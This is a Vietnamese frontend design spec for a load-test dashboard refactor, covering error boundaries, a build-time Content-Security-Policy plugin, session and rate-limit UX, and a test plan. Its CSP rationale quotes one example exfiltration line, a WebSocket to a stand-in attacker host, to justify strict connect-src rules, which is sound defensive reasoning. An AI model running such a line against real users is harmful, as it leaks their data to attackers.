# UI-SPEC — Prod-refactor DELTA (frontend)

**Status**: ✅ FINAL — design council synthesis (2026-08-04)
**Nguồn chuẩn**: `docs/PRD-prod-refactor.md` (APPROVED), `docs/PLAN-prod-refactor.md` (APPROVED — T-08, T-09, T-12), `docs/UI-SPEC-loadtest-tool.md` (KHÔNG thay đổi — spec này là **delta additive**), `docs/DESIGN-prod-refactor.md` (FINAL — backend contract cho frontend).
**Tính chất**: **DELTA layer** — mọi mục additive, KHÔNG đổi hành vi dashboard loadtest (PRD §2.2 OUT OF SCOPE), KHÔNG đổi route/URL/layout, KHÔNG đổi 7 wireframe.

---

## 0. Tóm tắt quyết định (TL;DR)

| # | Delta | Quyết định (chốt) |
|---|---|---|
| D-1 | ErrorBoundary | 1 component `src/components/ErrorBoundary.tsx`, mount **2 lớp**: app-level (bọc `<Routes/>` trong `App.tsx`, KHÔNG resetKey — tránh crash-loop) + route-level loadtest (bọc `<Outlet/>` trong `app-shell.tsx`, reset theo `location.pathname`). Nút "Về trang chủ" layer-1 = navigate + reset sau 1-frame (fix no-op). |
| D-2 | CSP | **1 nguồn duy nhất = meta inject ở build** (Vite plugin `injectCspMeta`, `apply:'build'`) → chỉ tồn tại trong `dist/index.html`; source `index.html` giữ sạch (dev không bị Vite preamble/HMR chặn). `connect-src` = **explicit origins, KHÔNG scheme-wildcard `ws:`/`wss:`** (D-7). nginx KHÔNG set CSP header (tránh double-CSP). |
| D-3 | Session notice | Banner `AlertBanner variant="warning"` dismissible, hiện khi `expiresAt - now ≤ 30 phút`; **text động từ `expiresAt`** (static snapshot tại thời điểm hiện banner — không live countdown, không hardcode "12 giờ"). KHÔNG refresh, KHÔNG chặn. |
| D-4 | loadPrefs validation | Pure function `parseLoadtestPrefs` (`src/store/loadtest-prefs.ts`): sai shape/JSON → default im lặng (không toast). |
| D-5 | 429 / rate-limit UX | `toApiError` giữ `retryAfterSec`; **start/stop disable + "Thử lại sau Ns" countdown**; sticky header stop lỗi → toast (không im lặng). |
| D-6 | Register-gate 403 UX | `/config` thêm `allowRegister`; **ẩn CTA đăng ký + route `/loadtest/register` khi `allowRegister=false`** (hết dead-end 403). |
| D-7 | CORS-misconfig UX | `toApiError` phân biệt network/CORS → message "kiểm tra `LOADTEST_CORS_ORIGIN`". |
| D-8 | Frontend test | `vitest.workspace.ts` (2 projects), 12 test + 2 regression mới (socket-token, session dynamic). Coverage scope chỉ frontend project. |
| D-9 | `dangerouslySetInnerHTML` | Refactor `MatchingScreen.tsx:131` `search` sang JSX; thêm eslint `react/no-danger` (T-08). |

---

## 1. ErrorBoundary (T-08 / F-9) — `src/components/ErrorBoundary.tsx`

### 1.1 Component (class — bắt buộc cho error boundary)
```
Props: resetKey?: string | number; homePath?: string; onError?: (error, info) => void
State: { hasError: boolean; error: Error | null }
Render lỗi: <div role="alert" tabIndex={-1} ref={focusRef} class="min-h-[70vh] flex items-center justify-center p-4">
  <Card class="max-w-md w-full border-destructive/40 bg-destructive/10 text-destructive p-6 space-y-4">
    <h1 class="text-base font-semibold">Đã xảy ra lỗi không mong muốn</h1>
    <p class="text-sm opacity-90">Ứng dụng vừa gặp sự cố khi hiển thị trang này. Dữ liệu run được giữ trên server — bạn có thể tải lại trang để tiếp tục.</p>
    <div class="flex flex-wrap gap-3">
      <Button class="min-h-11" onClick={() => window.location.reload()}>Tải lại trang</Button>
      {homePath && <Button variant="outline" class="min-h-11" onClick={handleHome}>Về trang chủ</Button>}
    </div>
    {import.meta.env.DEV && error && <details><summary>Chi tiết kỹ thuật (dev)</summary><pre>{error.message}</pre></details>}
  </Card>
</div>
```
Quyết định cụ thể:
1. **Class component** + `getDerivedStateFromError` + `componentDidCatch` (gọi `onError`). StrictMode không ảnh hưởng.
2. **Focus management**: khi `hasError` false→true, focus container (`tabIndex={-1}`); nút "Tải lại trang" đứng trước trong DOM → nhận focus đầu tiên.
3. **PII policy — HARD RULE**: prod KHÔNG render `error.message`/`error.stack`/componentStack (chứa URL/query/token); chỉ console.error sanitized `{ name, code? }`; `import.meta.env.DEV` mới hiện `<details>`.
4. **Reset**:
   - Layer-2 (route-level): `resetKey={location.pathname}` → `componentDidUpdate` đổi key + `hasError` → reset (chuyển trang tự reset).
   - Layer-1 (app-level): **KHÔNG** resetKey tự động (crash-loop — page lỗi → navigate → reset → crash lại vô hạn). Nút "Về trang chủ" dùng **handleHome (fix no-op D-19)**:
     ```ts
     const handleHome = () => { navigate(homePath); requestAnimationFrame(() => this.setState({ hasError: false })); };
     ```
     Reset chỉ khi user chủ động bấm (không tự động) → không crash-loop; nếu trang mới crash, boundary re-arm bình thường.
5. **Fallback tự bảo vệ**: render fallback trong try/catch; fallback throw → trả `<div>` text tĩnh thuần.
6. **Không đụng auth state**: boundary không gọi logout/clearSession (401 flow hiện có `api.ts:87-89`, `loadtest-api.ts:62-70` tự xử lý).

### 1.2 Mounting — 2 lớp
**Lớp 1 — App-level** (`App.tsx`, trong `<BrowserRouter>` ngoài `<TooltipProvider/>`):
```
<BrowserRouter>
  <ErrorBoundary homePath={routes.chat}>        // bắt AuthGate, guard, router crash; KHÔNG resetKey
    <TooltipProvider>
      <AuthGate />
      <Routes>…(giữ nguyên)…</Routes>
      <Toaster />
    </TooltipProvider>
  </ErrorBoundary>
</BrowserRouter>
```
**Lớp 2 — Route-level loadtest** (`app-shell.tsx`, bọc `<Outlet/>` trong `<main>`):
```
<main>
  <ErrorBoundary resetKey={location.pathname} homePath={routes.loadtest}>
    <Outlet />
  </ErrorBoundary>
</main>
```
- Boundary lớp 2 bọc TRONG guard `RequireLoadtestAuth` (guard trả `<Outlet/>`, `App.tsx:59-70`) → guard redirect trả null không bao giờ crash → không chặn luồng login. Crash trong guard → lớp 1 bắt. Crash trong 1 page → lớp 2 bắt, shell + nav + poll 1s sống.
- KHÔNG tạo boundary riêng từng page (1 boundary route-level đủ, reset theo pathname).

### 1.3 A11y
`role="alert"`; focus container + reload autofocus; nút `min-h-11` (44px); token `--destructive` sẵn có (không màu mới); icon `CircleAlert` + chữ (không màu đơn thuần); không animation.

### 1.4 Acceptance (T-08 AC)
- [ ] Component throw → fallback hiện (role=alert, nút "Tải lại trang" autofocus), **không** render `error.message` ở prod; không trắng trang.
- [ ] Layer-1 "Về trang chủ" bấm → navigate + reset (không phải no-op); Layer-2 chuyển trang → tự reset.
- [ ] Redirect login khi chưa auth vẫn hoạt động (boundary không chặn guard).

---

## 2. CSP (T-08 / F-10, SEC-4) — 1 nguồn duy nhất, meta ở build

### 2.1 Quyết định (chốt — D-8, D-16)
- **Canonical = meta CSP inject vào build output** qua Vite plugin `injectCspMeta` (`apply: 'build'`). Source `index.html` giữ **sạch, KHÔNG meta** (dev không chặn Vite react-refresh inline preamble + HMR ws).
- **nginx.conf (T-12) KHÔNG set CSP header** (hoặc nếu bắt buộc: copy **đúng y hệt** chuỗi + comment `GIỮ ĐỒNG BỘ với PROD_CSP trong vite.config.ts`). Tránh double-CSP intersection.
- `frame-ancestors`/clickjacking: **delegate nginx header riêng** (vd `X-Frame-Options: DENY` hoặc `frame-ancestors 'none'` qua header — meta không enforce được); ghi limitation vào THREAT-MODEL (D-10).

### 2.2 CSP PROD — exact string (chỉ trong `dist/index.html`)
```
default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com; object-src 'none'; base-uri 'self'; form-action 'self'
```
Lý do từng directive:
- `script-src 'self'` — build output là external module scripts (đã verify `index.html` không inline script/style; `@vitejs/plugin-react` preamble dev-only). Control chính cho XSS→token theft.
- `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com` — BẮT BUỘC `'unsafe-inline'` (recharts/framer-motion/sonner dùng inline style attributes — không thể bỏ; style injection không chạy script).
- `font-src https://fonts.gstatic.com` — stylesheet Google Fonts (`index.html:12-15`).
- `connect-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com` — **KHÔNG scheme-wildcard `ws:`/`wss:`** (D-7: post-XSS script có thể `new WebSocket('ws://attacker:port')`). `'self'` phủ: socket khi gateway SAME-ORIGIN (nginx proxy `/auth` + `/socket.io`), Vite proxy `/api/loadtest` (dev same-origin). **Cả 2 font origins** vì `<link rel="preconnect" href="https://fonts.gstatic.com">` (`index.html:11`) thuộc `connect-src` (D-16).
- **Gateway origin khác (prod topology không chốt)**: build-time env `VITE_CSP_CONNECT_SRC` (space-separated). Khi set, connect-src = `'self' https://fonts.googleapis.com https://fonts.gstatic.com <VITE_CSP_CONNECT_SRC>`. Default rỗng = same-origin assumption.
- `img-src 'self' data:` — favicon + avatar data-URI; report export dùng `URL.createObjectURL` cho `<a download>` (`loadtest-api.ts:170-177`) — không phải `<img>` → không cần `blob:`.
- `object-src 'none'; base-uri 'self'; form-action 'self'` — best-practice.
- KHÔNG `upgrade-insecure-requests` (chặn http local dev; để nginx/ingress lo).

### 2.3 Plugin (vite.config.ts, ~15 dòng)
```ts
const PROD_CSP = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com; object-src 'none'; base-uri 'self'; form-action 'self'";
function injectCspMeta(): Plugin {
  return {
    name: 'inject-csp-meta',
    apply: 'build',
    transformIndexHtml(html) {
      const connect = [ "'self'", "https://fonts.googleapis.com", "https://fonts.gstatic.com", (import.meta.env.VITE_CSP_CONNECT_SRC ?? '').trim() ].filter(Boolean).join(' ');
      const csp = PROD_CSP.replace("connect-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com", `connect-src ${connect}`);
      return { html, tags: [{ tag: 'meta', attrs: { 'http-equiv': 'Content-Security-Policy', content: csp }, injectTo: 'head-prepend' }] };
    },
  };
}
```
Kết quả: `npm run dev` → không meta CSP (dev chạy bình thường); `npm run build` → `dist/index.html` chứa meta strict.

### 2.4 CSP DEV — reference (KHÔNG inject, chỉ tài liệu)
Nếu muốn CSP trong dev (đội tự quyết, không bắt buộc): `script-src 'self' 'unsafe-inline'` (react-refresh preamble) + `connect-src 'self' http://localhost:3000 ws://localhost:3000 ws://localhost:5173 https://fonts.googleapis.com https://fonts.gstatic.com`. Chốt: **không inject để tránh drift 2 chuỗi**.

### 2.5 Acceptance (T-08 AC)
- [ ] `npm run build` → `grep -c "Content-Security-Policy" dist/index.html` = 1; `npm run dev` mở console không lỗi CSP (font, ws, HMR, proxy).
- [ ] Prod CSP không chứa `ws:` / `wss:` (grep = 0).
- [ ] Prod smoke: REST + socket pass CSP (T-11).

---

## 3. Session expiry notice (T-09 / L-6) — text động

### 3.1 Logic (pure, module mới `src/lib/loadtest-session.ts`)
```ts
export const SESSION_WARN_BEFORE_MS = 30 * 60 * 1000;
export function sessionRemainingMs(expiresAt: number, now = Date.now()): number { return expiresAt - now; }
export function shouldWarnSession(expiresAt: number | null, now = Date.now()): boolean {
  if (!expiresAt || expiresAt <= 0) return false;
  const rem = sessionRemainingMs(expiresAt, now);
  return rem > 0 && rem <= SESSION_WARN_BEFORE_MS;
}
/** Text động — KHÔNG hardcode "12 giờ" (D-14). Static snapshot tại thời điểm mount. */
export function sessionExpiryText(expiresAt: number, now = Date.now()): string {
  const hours = Math.max(1, Math.round(sessionRemainingMs(expiresAt, now) / 3600_000));
  return `Phiên loadtest hết hạn trong ${hours} giờ kể từ khi đăng nhập. Hãy lưu dữ liệu cần thiết — sau khi hết hạn bạn phải đăng nhập lại.`;
}
```
- `expiresAt` là nguồn sự thật duy nhất (`loadtest-auth-storage.ts:25`, `loadtest-auth.store.ts:42-47`); số giờ = snapshot tại mount, **không live countdown trong `role="alert"`** (tránh re-announce mỗi phút — a11y live-region discipline).

### 3.2 Component `src/components/loadtest/session-expiry-banner.tsx`
- Hook `useSessionExpiryNotice()`: subscribe `expiresAt`; `setInterval` 60s re-check (dừng khi unmount); trả `{ visible, text }`; `visible = shouldWarnSession(expiresAt)`.
- Render trong `app-shell.tsx`, ngay trên `<main>` cạnh banner reconnecting (`app-shell.tsx:273-279`), xếp chồng `px-4 pt-3`:
```
<AlertBanner variant="warning" title="Phiên đăng nhập sắp hết hạn" description={text} dismissible onDismiss={…} />
```
- Quyết định: dismiss per tab session (`useState`), KHÔNG persist vào `loadtest.prefs`; không nút "Gia hạn" (không refresh server-side — constraint); chỉ hiện khi đã đăng nhập (banner trong AppShell sau guard).

### 3.3 Acceptance (T-09 AC)
- [ ] Mock `expiresAt` ≤ 30 phút → banner hiện, dismissible; text hiển thị số giờ từ `expiresAt` (không hardcode); hết hạn thật → vẫn logout qua 401 như cũ.

---

## 4. loadPrefs schema validation (T-09 / L-7)

### 4.1 Module mới `src/store/loadtest-prefs.ts`
```ts
export interface LoadtestPrefs { requireEnvConfirm: boolean }
export const DEFAULT_PREFS: LoadtestPrefs = { requireEnvConfirm: true };
export const PREFS_KEY = 'loadtest.prefs';
export function parseLoadtestPrefs(raw: string | null): LoadtestPrefs {
  if (!raw) return DEFAULT_PREFS;
  try {
    const obj: unknown = JSON.parse(raw);
    if (typeof obj === 'object' && obj !== null) {
      const p = obj as Record<string, unknown>;
      if (typeof p.requireEnvConfirm === 'boolean') return { requireEnvConfirm: p.requireEnvConfirm };
    }
  } catch { /* fall through → default */ }
  return DEFAULT_PREFS;
}
export function loadPrefs(): LoadtestPrefs { return parseLoadtestPrefs(localStorage.getItem(PREFS_KEY)); }
export function savePrefs(p: LoadtestPrefs): void { /* giữ try/catch hiện tại (loadtest.store.ts:39-45) */ }
```
- `loadtest.store.ts`: xoá `loadPrefs/savePrefs/PREFS_KEY` local (`:27-45`), import từ module mới; `requireEnvConfirm: loadPrefs().requireEnvConfirm` (`:103`) + `setRequireEnvConfirm` giữ nguyên.
- **Silent default, không toast** (store-creation ngoài React tree; pref self-controlled; G-6). Fix đúng failure mode: `'{"requireEnvConfirm":"false"}'` (string truthy) / `null` / `1` → default `true` (an toàn nhất).

### 4.2 Acceptance
- [ ] `'{"requireEnvConfirm":"false"}'` → `false` đúng kiểu; JSON hỏng / non-object / null → default im lặng.

---

## 5. 429 / rate-limit UX (T-09 — D-11, F-3, F-8)

### 5.1 `src/lib/loadtest-api.ts` — giữ `retryAfterSec`
```ts
// toApiError: thêm field retryAfterSec
export interface LoadtestApiError { statusCode: number; message: string; error?: string; retryAfterSec?: number; … }
// khie axios 429: retryAfterSec = data.retryAfterSec ?? Number(response.headers['retry-after']) ?? 0
```
- `retryAfterSec` là **contract bắt buộc** trong envelope 429 (`{ …, retryAfterSec }` + `Retry-After` header — backend DESIGN §2) — không phải gợi ý.

### 5.2 ControlPanelPage (`src/pages/loadtest/ControlPanelPage.tsx`)
- **Start button**: khi 429 → disable nút BẮT ĐẦU + hiện "Thử lại sau Ns" (countdown từ `retryAfterSec`, setInterval 1s, tick tới 0 → re-enable + clear). Không spam lại 429.
- **Stop/Pause/Kill**: nếu 429 → toast lỗi (giống `ControlPanelPage` pattern) thay vì nuốt im lặng.

### 5.3 Sticky header stop (`src/components/loadtest/app-shell.tsx:43-47`)
- Hiện tại: `console.warn` DUY NHẤT, không toast. **Sửa**: lỗi → toast `toApiError(err).message` (có `retryAfterSec` nếu 429). Đồng bộ hành vi 2 nút stop (F-3).

### 5.4 Acceptance
- [ ] 429 từ start → nút disable + countdown "Thử lại sau Ns"; re-enable khi hết; không gửi thêm request.
- [ ] Sticky stop lỗi → toast (không im lặng); 429 trên stop → toast kèm retryAfterSec.

---

## 6. Register-gate 403 UX (T-09 — D-17, F-7)

### 6.1 Backend contract (DESIGN §7.3)
- `GET /api/loadtest/config` trả thêm `allowRegister: boolean` (additive — frontend đọc như field mới, không phá `ApiError` parse).

### 6.2 Frontend
- `RegisterPage` + `LoginPage`: khi `allowRegister === false` (đọc từ config lúc login page mount / store) → **ẩn CTA "Chưa có tài khoản? Đăng ký"** (`LoginPage.tsx:110-113`) và **ẩn route `/loadtest/register`** (react-router redirect → `/loadtest/login` hoặc render notice). Xoá dead-end 403.
- Nếu user vẫn gọi register trực tiếp (curl) → 403 `REGISTER_DISABLED` hiện message rõ ràng (`RegisterPage.tsx:57,138` — giữ pattern).
- Lưu ý: 403 REGISTER_DISABLED tính 1 fail của fail-window (backend §2) — ẩn CTA giảm fail oan.

### 6.3 Acceptance
- [ ] `allowRegister=false` → không thấy CTA đăng ký ở login; `/loadtest/register` redirect/ẩn; `allowRegister=true` → CTA hiện như cũ.

---

## 7. CORS-misconfig UX (T-09 — D-18, F-9)

### 7.1 `toApiError` phân biệt network/CORS
- Khi `error.response === undefined` (axios network error) → `kind: 'network'`, message: `"Không kết nối được đến loadtest server (port 3401). Nếu truy cập cross-origin, kiểm tra LOADTEST_CORS_ORIGIN."` (thay message default gây hiểu nhầm).
- Khi có response + CORS bị chặn (browser không cho đọc response) → vẫn rơi vào network branch (browser chặn), message phủ cả 2 case.
- Vite proxy same-origin → CORS không bị enforce (F-9 REFUTED cho luồng chuẩn); đây là hardening cho truy cập cross-origin trực tiếp.

### 7.2 Acceptance
- [ ] Loadtest server tắt → message "Không kết nối được…" rõ ràng (không phải "server down" gây hiểu nhầm CORS); set `LOADTEST_CORS_ORIGIN` sai → message nhắc CORS.

---

## 8. Frontend test plan (T-09 — F-11, L-5, D-15, D-20)

### 8.1 Cấu hình — vitest workspace (2 projects)
- `vitest.workspace.ts` (root): `['./loadtest/vitest.config.ts', './vitest.config.ts']` — KHÔNG đổi `loadtest/vitest.config.ts`.
- `vitest.config.ts` (root mới): `environment:'jsdom'`, `include: ['src/**/*.test.{ts,tsx}']`, `setupFiles: ['src/test/setup.ts']`, alias `@` → `./src`, `globals:false`.
- **Coverage scope (D-20)**: chỉ `include: ['src/lib/loadtest-format.ts', 'src/store/loadtest.store.ts']` (G-1 W3: ≥ 70% format helpers + selectors) — KHÔNG đếm loadtest project (tránh ngưỡng ảo).
- `src/test/setup.ts`: `@testing-library/jest-dom/vitest` + stub `matchMedia`/`ResizeObserver`/`scrollIntoView` (chỉ khi test component).
- scripts: `"test": "vitest run"`, `"test:watch"`, `"test:coverage"`; devDeps mới (đều devDependencies — zero-dep runtime giữ): `jsdom`, `@testing-library/react`, `@testing-library/dom`, `@testing-library/jest-dom`, `@vitest/coverage-v8`.
- Fallback workspace: `"test": "vitest run --config loadtest/vitest.config.ts && vitest run --config vitest.config.ts"`.

### 8.2 Danh sách test (gồm 2 regression mới)
| # | File | Mục tiêu |
|---|---|---|
| 1 | `src/lib/loadtest-format.test.ts` | `fmtNum/fmtCompact/fmtMs/fmtClock/fmtTickTime/fmtDateTime/fmtRange` + edge (NaN, âm, 0, ≥1000) |
| 2 | `src/store/loadtest-prefs.test.ts` | `parseLoadtestPrefs`: valid boolean, `"false"`/`null`/`1`, JSON hỏng, non-object, null → default; `loadPrefs` localStorage mock |
| 3 | `src/store/loadtest.store.test.ts` | `selectTicks`, `RING_CAPACITY`, `DEFAULT_PROFILE`, `setRequireEnvConfirm` roundtrip |
| 4 | `src/lib/env.test.ts` | Defaults khi env trống: `gatewayUrl=http://localhost:3000`, `refreshEndpoint=/auth/refresh-token` (regression F-6) |
| 5 | `src/lib/api.test.ts` | `toApiError` (response/network/CLIENT), `unwrap`, **contract refresh**: `refreshEndpoint === '/auth/refresh-token'` + `doRefresh` gửi `{ refreshToken }` (regression F-6, G-3) |
| 6 | `src/lib/loadtest-api.test.ts` | `toApiError` (statusCode/message/errors/warnings, default message), **`retryAfterSec` giữ từ envelope + header** (D-11) |
| 7 | `src/lib/loadtest-auth-storage.test.ts` | `load`/`save`/`clear` roundtrip, token không string → null, expiresAt default 0 |
| 8 | `src/lib/loadtest-session.test.ts` | `shouldWarnSession` (null/0/expired/trong 30p/ngoài 30p), `sessionExpiryText` động (D-14) |
| 9 | `src/store/auth.store.test.ts` | `hydrate` (không token/hết hạn/hợp lệ), `login` success/fail mock api |
| 10 | `src/store/loadtest-auth.store.test.ts` | `initialize` (không session/hết hạn/hợp lệ + authMe mock), `clearSession` |
| 11 | `src/components/ErrorBoundary.test.tsx` | Child render; child throw → fallback (role=alert, nút reload); resetKey đổi → reset; **Layer-1 home button reset** (D-19) |
| 12 | `src/lib/socket.test.ts` | **REGRESSION socket-token (D-15)**: `io()` options object → `query.token === undefined`, `extraHeaders.Authorization === 'Bearer <token>'` |
| 13 | `loadtest/socket-farm.test.ts` (node) | **REGRESSION socket-token (D-15)**: `io()` options → `query.token === undefined` (sau khi T-08 bỏ query) — nằm trong T-11 test list |

**KHÔNG test**: chart component (recharts + ResizeObserver), socket full (mock io — E2E T-11 phủ), `loadtest-api` full (contract test server T-11 phủ).

### 8.3 Acceptance (T-09 AC)
- [ ] `npm run test` xanh (workspace: loadtest + frontend); `npm run test:coverage` ≥ 70% cho `loadtest-format.ts` + `loadtest.store.ts`.
- [ ] 2 regression socket-token xanh; `parseLoadtestPrefs` default đúng; `sessionExpiryText` động.

---

## 9. File map (delta)

| File | Trạng thái | Nội dung |
|---|---|---|
| `src/components/ErrorBoundary.tsx` | MỚI | §1 |
| `src/App.tsx` | SỬA | Bọc `<Routes/>` bằng Layer-1 (`homePath={routes.chat}`, không resetKey) |
| `src/components/loadtest/app-shell.tsx` | SỬA | Bọc `<Outlet/>` Layer-2 (`resetKey={location.pathname}`); `SessionExpiryBanner` trên `<main>`; sticky stop toast |
| `src/components/loadtest/session-expiry-banner.tsx` | MỚI | §3 |
| `src/lib/loadtest-session.ts` | MỚI | §3.1 |
| `src/store/loadtest-prefs.ts` | MỚI | §4 |
| `src/store/loadtest.store.ts` | SỬA | Import prefs từ module mới |
| `src/lib/loadtest-api.ts` | SỬA | `toApiError` + `retryAfterSec` + network/CORS message |
| `src/pages/loadtest/ControlPanelPage.tsx` | SỬA | Start 429 disable + countdown; stop/pause/kill toast |
| `src/pages/loadtest/LoginPage.tsx` | SỬA | Ẩn CTA đăng ký khi `allowRegister=false` |
| `src/pages/loadtest/RegisterPage.tsx` | SỬA | Guard route ẩn khi `allowRegister=false` |
| `src/components/loadtest/require-auth.tsx` | SỬA (tùy chọn) | Đọc `allowRegister` từ config cho route guard |
| `src/components/MatchingScreen.tsx` | SỬA | Refactor `dangerouslySetInnerHTML` (`:131`) → JSX (D-9, T-08) |
| `vite.config.ts` | SỬA | Plugin `injectCspMeta` (`apply:'build'`) |
| `index.html` | **KHÔNG sửa** | Giữ sạch — CSP chỉ trong build output |
| `vitest.workspace.ts` | MỚI | §8.1 |
| `vitest.config.ts` (root) | MỚI | §8.1 |
| `src/test/setup.ts` | MỚI | §8.1 |
| `package.json` | SỬA | scripts test + 5 devDeps |
| `eslint.config.*` | SỬA | Thêm rule `react/no-danger` (D-9) |
| `docker/nginx.conf` (T-12) | SỬA | **KHÔNG set CSP header** (hoặc copy y hệt + comment đồng bộ); có thể set `X-Frame-Options`/`frame-ancestors` riêng |

---

## 10. Acceptance checklist (map T-08/T-09/T-11)

- [ ] `ErrorBoundary.tsx` tồn tại; child throw → fallback (role=alert, reload autofocus, không `error.message` prod); layer-1 home button = navigate + reset; layer-2 reset theo pathname.
- [ ] `npm run build` → `dist/index.html` chứa meta CSP; `grep -c "Content-Security-Policy"` = 1; không `ws:`/`wss:` trong chuỗi; `npm run dev` không lỗi CSP (font, ws, HMR, proxy).
- [ ] Session banner hiện ≤ 30 phút, dismissible, text động từ `expiresAt`; hết hạn → logout qua 401 như cũ.
- [ ] `loadPrefs` với `'{"requireEnvConfirm":"false"}'` → `false` đúng kiểu; JSON hỏng → default im lặng.
- [ ] 429 start → disable + countdown; sticky stop lỗi → toast; `retryAfterSec` trong `toApiError`.
- [ ] `allowRegister=false` → ẩn CTA đăng ký + route; `true` → như cũ.
- [ ] `npm run test` xanh (workspace); `test:coverage` ≥ 70% (2 file); 2 regression socket-token xanh.
- [ ] Không diff đổi route/URL/layout dashboard; G-6 review xác nhận không đổi hành vi UI.
- [ ] `MatchingScreen.tsx` không còn `dangerouslySetInnerHTML`; eslint `react/no-danger` active.